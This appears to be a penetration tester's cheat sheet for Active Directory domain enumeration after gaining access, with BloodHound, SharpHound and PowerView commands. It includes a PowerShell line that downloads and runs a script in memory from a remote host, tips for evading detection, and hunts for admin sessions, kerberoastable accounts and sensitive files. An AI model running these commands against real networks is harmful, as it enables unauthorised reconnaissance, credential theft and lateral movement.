## Domain Enumeration

One of my favourite things to do when landing in an environment is to take stock of everything that's now available, accessible, what users have what permissions, what groups to try and move toward, etc. 

Naturally, as everyone knows, the most succinct way to accomplish this is by using the hound. Bloodhound is an exceptional tool with incredible capabilities. It can be run from the target in both Powershell and .NET formats, whilst also being executable locally from your attack box using the python version. Valid credentials are required to enumerate a domain with Bloodhound.

Follow the installation instructions at:
 https://bloodhound.readthedocs.io/en/latest/index.html 

Precompiled Sharphound is available at: 
 https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors 

Build from source using:
 https://github.com/BloodHoundAD/SharpHound3 

Get Bloodhound.py from:
 https://github.com/fox-it/BloodHound.py 

```bash
# Run bloodhound.py against MATRIX.LOCAL that has the IP 10.10.10.10
python3 bloodhound.py -u Toby -p 'Coff33*' -ns 10.10.10.10 -d MATRIX.LOCAL -c all --dns-tcp
python3 bloodhound.py -u Neo -p 'Passw0rd' -ns 10.10.10.10 -d MATRIX.local -c all --dns-tcp
```

```powershell
# Run Sharphound locally on a target using all collection methods + group policies (NOISY)
Sharphound.exe -c All,GPOLocalGroup
# Run Sharphound locally on different, trusted domain
Sharphound.exe -c All,GPOLocalGroup -d child.example.local

# Download and run Sharphound in memory with powershell
IEX((New-Object System.Net.WebClient).downloadString('http://10.10.10.10/Sharphound.ps1')); Invoke-BloodHound -CollectionMethod All

#Less noisy and avoids advanced threat analytics
Invoke-BloodHound -CollectionMethod All -ExcludeDC

#Only performs collections using LDAP - Best used at 9am or 1pm when everyone is logging back in
Invoke-BloodHound -CollectionMethod DcOnly 
```


## Manual Enumeration with PowerView

We can manually perform the enumeration using PowerView, or the .NET alternative SharpView.

 https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 

 https://github.com/tevora-threat/SharpView 

Remember! With all of these commands Powershell allows you to filter by piping the output and using `select` with column headings. 
```powershell
# Collect general domain information - Look for password policies and view parent domains
Get-Domain
Get-DomainController | Select Name
Get-DomainPolicyData | select -ExpandProperty SystemAccess 

# Get Forest Information
Get-ForestDomain

# Enumerate Users
Get-NetUser 
Get-NetUser Toby | Select samaccountname,memberof

# Enumerate Computers (I like to ping them after to resolve them to an IP)
Get-DomainComputer | Select DnsHostName

# Get Domain Groups
Get-DomainGroup | select SamAccountName

# Get members of a domain group
Get-DomainGroupMember -Identity "Management Users" | select MemberDistinguishedName

# Get Group Policy Objects in the domain or those applied to a specific computer
Get-DomainGPO | Select DisplayName
Get-DomainGPO -ComputerIdentity dc04.example.com | Select DisplayName

# Find GPOs mapped to Group Names
Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers

# Find machines where a specific user or group are members of a specific local group
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName

# Query all machines for users of a specific group that are currently logged in (Default: Domain Admin)
Find-DomainUserLocation | select UserName, SessionFromName

# Find session information for the remote machine. Omit computer name to run locally.
Get-NetSession -ComputerName dc04.example.com | select CName, UserName

# Get domain trust and directions. Remember trust flows in the opposite direction to access. 
Get-DomainTrust
Get-DomainTrust -Domain child.example.com

# Forest enumeration
Get-NetForest -Forest matrix.local

# Find shares in specific domain - Only show those we have access to as the executing user
Find-DomainShare -ComputerDomain MATRIX.LOCAL -CheckShareAccess
Invoke-Sharefinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC

# Find kerberoastable users
Get-NetUser | select samaccountname,serviceprincipalname

# Create a new user credential object to use in the domain
$passwd = ConvertTo-SecureString 'passw0rd' -AsPlainText -Force   
$creds = New-Object System.Management.Automation.PSCredential ("matrix\neo", $passwd) 
Enter-PSSession -ComputerName dc04 -Credential $creds

# Attempts to find files with juicy bits
Invoke-FileFinder -Verbose

# Ping using Powershell to find hosts
1..254 | ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.10.$_' and Timeout=200 and ResolveAddressNames='true' and StatusCode=0" | select ProtocolAddress*}
```